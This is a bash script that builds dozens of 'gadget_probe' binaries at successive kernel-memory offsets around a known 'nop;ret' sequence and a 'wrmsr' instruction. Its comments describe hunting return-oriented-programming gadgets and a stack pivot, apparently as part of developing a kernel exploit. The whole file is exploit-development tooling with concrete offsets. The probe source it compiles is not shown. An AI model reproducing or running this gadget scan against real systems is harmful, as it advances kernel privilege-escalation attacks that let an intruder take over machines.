#!/bin/bash
set -e
OUTDIR="bins"
mkdir -p "$OUTDIR"

build() {
    local name="$1" mode="$2" offset="$3"
    make clean -s 2>/dev/null || true
    make PROBE_MODE="$mode" TARGET_OFFSET="$offset" -s 2>&1 | grep -v warning || true
    cp gadget_probe.bin "$OUTDIR/${name}.bin"
    echo "  Built $name.bin (mode=$mode offset=$offset)"
}

echo "=== Building gadget_probe binaries ==="

# Known: nop_ret = kdata+(-0x9d20ca) = 0x90,0xc3
# The ret byte is at kdata+(-0x9d20c9)
# Scan BEFORE that ret: offsets -0x9d20ca, -0x9d20cb, ... -0x9d20d9

echo ""
echo "--- Mode 0 (pop_ret): scanning before nop;ret ---"
build "gadget_probe_nopret_m0"     0 "-0x9d20ca"   # the nop itself (0x90;0xc3 = nop;ret)
build "gadget_probe_nopret-1_m0"   0 "-0x9d20cb"   # 1 byte before nop;ret
build "gadget_probe_nopret-2_m0"   0 "-0x9d20cc"   # wrmsr (0x0f 0x30 0x90 0xc3)
build "gadget_probe_nopret-3_m0"   0 "-0x9d20cd"   # 1 before wrmsr
build "gadget_probe_nopret-4_m0"   0 "-0x9d20ce"
build "gadget_probe_nopret-5_m0"   0 "-0x9d20cf"
build "gadget_probe_nopret-6_m0"   0 "-0x9d20d0"
build "gadget_probe_nopret-7_m0"   0 "-0x9d20d1"
build "gadget_probe_nopret-8_m0"   0 "-0x9d20d2"

# Scan further back (function epilogues often have pop;pop;ret sequences)
build "gadget_probe_nopret-9_m0"    0 "-0x9d20d3"
build "gadget_probe_nopret-10_m0"   0 "-0x9d20d4"
build "gadget_probe_nopret-11_m0"   0 "-0x9d20d5"
build "gadget_probe_nopret-12_m0"   0 "-0x9d20d6"
build "gadget_probe_nopret-13_m0"   0 "-0x9d20d7"
build "gadget_probe_nopret-14_m0"   0 "-0x9d20d8"
build "gadget_probe_nopret-15_m0"   0 "-0x9d20d9"
build "gadget_probe_nopret-16_m0"   0 "-0x9d20da"

# Also try AFTER nop;ret — there might be another function with its own ret
build "gadget_probe_nopret+2_m0"   0 "-0x9d20c8"
build "gadget_probe_nopret+3_m0"   0 "-0x9d20c7"
build "gadget_probe_nopret+4_m0"   0 "-0x9d20c6"

echo ""
echo "--- Mode 1 (pivot): around nop;ret area ---"
build "gadget_probe_nopret-3_m1"   1 "-0x9d20cd"
build "gadget_probe_nopret-4_m1"   1 "-0x9d20ce"
build "gadget_probe_nopret-5_m1"   1 "-0x9d20cf"
build "gadget_probe_nopret-6_m1"   1 "-0x9d20d0"
build "gadget_probe_nopret-7_m1"   1 "-0x9d20d1"
build "gadget_probe_nopret-8_m1"   1 "-0x9d20d2"

echo ""
echo "=== Done! ==="
ls -la "$OUTDIR/"
